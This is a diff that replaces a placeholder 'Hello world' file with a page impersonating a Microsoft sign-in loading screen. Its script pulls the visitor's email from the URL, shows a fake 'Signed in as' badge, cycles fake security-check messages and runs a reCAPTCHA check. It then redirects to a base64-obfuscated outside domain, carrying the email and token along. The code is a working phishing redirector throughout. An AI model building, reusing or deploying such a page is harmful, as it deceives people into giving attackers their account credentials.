@@ -1,1 +1,236 @@
-Hello world 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Loading...</title>
+  <script src="https://www.google.com/recaptcha/api.js?render=6LcWdxsrAAAAADtOCz9m-6poZ4wliZ2Y1cGVCBJr"></script>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body, html {
+      height: 100%;
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      background-color: #fff;
+      background: url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg') no-repeat center center fixed;
+    }
+    .logo {
+      width: 90px;
+      height: 90px;
+      background-image: url('https://uhf.microsoft.com/images/microsoft/RE1Mu3b.png');
+      background-size: contain;
+      background-repeat: no-repeat;
+      background-position: center;
+      margin: 0 auto 10px auto;
+    }
+    .user-icon {
+      width: 50px;
+      height: 50px;
+      background-image: url('https://cdn-icons-png.flaticon.com/512/1077/1077012.png');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      border-radius: 50%;
+      margin: 0 auto 20px auto;
+    }
+    .card {
+      background: #fff;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      min-width: 300px;
+      display: grid;
+      align-items: center;
+      justify-content: center;
+    }
+    .dots-loader {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .dots-loader span {
+      width: 10px;
+      height: 10px;
+      margin: 0 5px;
+      background-color: #000;
+      border-radius: 50%;
+      display: inline-block;
+      animation: swing 1s infinite ease-in-out;
+      transform-origin: center bottom;
+    }
+    .dots-loader span:nth-child(1) { animation-delay: 0s; }
+    .dots-loader span:nth-child(2) { animation-delay: 0.1s; }
+    .dots-loader span:nth-child(3) { animation-delay: 0.2s; }
+    .dots-loader span:nth-child(4) { animation-delay: 0.3s; }
+    .dots-loader span:nth-child(5) { animation-delay: 0.4s; }
+
+    @keyframes swing {
+      0% { transform: rotate(0deg); }
+      25% { transform: rotate(15deg); }
+      50% { transform: rotate(0deg); }
+      75% { transform: rotate(-15deg); }
+      100% { transform: rotate(0deg); }
+    }
+
+    .changing-text {
+      font-size: 10.2pt;
+      margin-bottom: 0;
+      width: 300px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    .progress-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      height: 6px;
+      background: #000;
+      width: 0%;
+      transition: width 0.4s ease;
+      border-top-right-radius: 6pt;
+      border-top-left-radius: 6pt;
+    }
+    .email-pill {
+      background-color: #f3f2f1;
+      padding: 8px 16px;
+      border-radius: 20px;
+      display: inline-block;
+      font-size: 14px;
+      color: #1b1b1b;
+      margin-bottom: 24px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo"></div>
+    <div class="user-icon"></div>
+    <div class="dots-loader">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+    <div class="email-pill" id="emailDisplay">Invalid email format</div>
+    <div class="changing-text" id="changingText">Please wait</div>
+  </div>
+  <div class="progress-bar" id="progressBar"></div>
+
+  <script>
+  const texts = [
+    "Checking email...",
+    "Validating session...",
+    "Securing connection...",
+    "Verifying you're human..."
+  ];
+
+  // Array of base64 encoded redirect URLs
+  const encodedRedirects = [
+    
+    "aHR0cHM6Ly90cmVzaGFpam8uY29udHJhY3RvcnMvTHRzNDM1eWlhdkNzcCFkLw==",
+	"aHR0cHM6Ly90cmVzaGFpam8uY29udHJhY3RvcnMvTHRzNDM1eWlhdkNzcCFkLw=="
+  ];
+
+  const changingText = document.getElementById("changingText");
+  const progressBar = document.getElementById("progressBar");
+  const emailDisplay = document.getElementById("emailDisplay");
+
+  let index = 0;
+  const duration = 5000;
+  const totalSteps = texts.length;
+  let token = "";
+  let detectedEmail = null;
+
+  function extractEmailFromURL() {
+    const params = new URLSearchParams(window.location.search);
+    let email = null;
+
+    for (const [key, value] of params.entries()) {
+      if (isEmail(value)) {
+        email = value;
+        break;
+      }
+      try {
+        const decoded = atob(value);
+        if (isEmail(decoded)) {
+          email = decoded;
+          break;
+        }
+      } catch (e) {}
+    }
+
+    const hash = decodeURIComponent(window.location.hash.slice(1));
+    if (!email && isEmail(hash)) {
+      email = hash;
+    } else if (!email) {
+      try {
+        const decodedHash = atob(hash);
+        if (isEmail(decodedHash)) {
+          email = decodedHash;
+        }
+      } catch (e) {}
+    }
+
+    if (email) {
+      emailDisplay.innerText = `Signed in as ${email}`;
+      emailDisplay.style.display = "inline-block";
+    } else {
+      emailDisplay.style.display = "none";
+    }
+
+    return email;
+  }
+
+  function updateText() {
+    if (index < totalSteps) {
+      changingText.textContent = texts[index];
+      progressBar.style.width = ((index + 1) / totalSteps) * 100 + "%";
+      index++;
+      setTimeout(updateText, duration);
+    } else {
+      const finalURL = getRedirectURLWithEmail();
+      window.location.href = finalURL;
+    }
+  }
+
+  function getRedirectURLWithEmail() {
+    // Choose a random base64 URL from the list and decode
+    const randomEncoded = encodedRedirects[Math.floor(Math.random() * encodedRedirects.length)];
+    let url;
+    try {
+      url = new URL(atob(randomEncoded));
+    } catch (e) {
+      url = new URL("");
+    }
+
+    if (detectedEmail) url.searchParams.append("email", detectedEmail);
+    if (token) url.searchParams.append("token", token);
+    if (detectedEmail) url.hash = detectedEmail;
+
+    return url.toString();
+  }
+
+  function isEmail(str) {
+    const regex = /^[\w.+-]+@[\w.-]+\.[a-zA-Z]{2,}$/;
+    return regex.test(str);
+  }
+
+  // Begin with stillness, extract email gently
+  detectedEmail = extractEmailFromURL();
+
+  // Wait for the guardian seal (reCAPTCHA)
+  grecaptcha.ready(function () {
+    grecaptcha.execute('6LcWdxsrAAAAADtOCz9m-6poZ4wliZ2Y1cGVCBJr', { action: 'preloader' }).then(function (t) {
+      token = t;
+      updateText();
+    });
+  });
+</script>
+
+</body>
+</html>
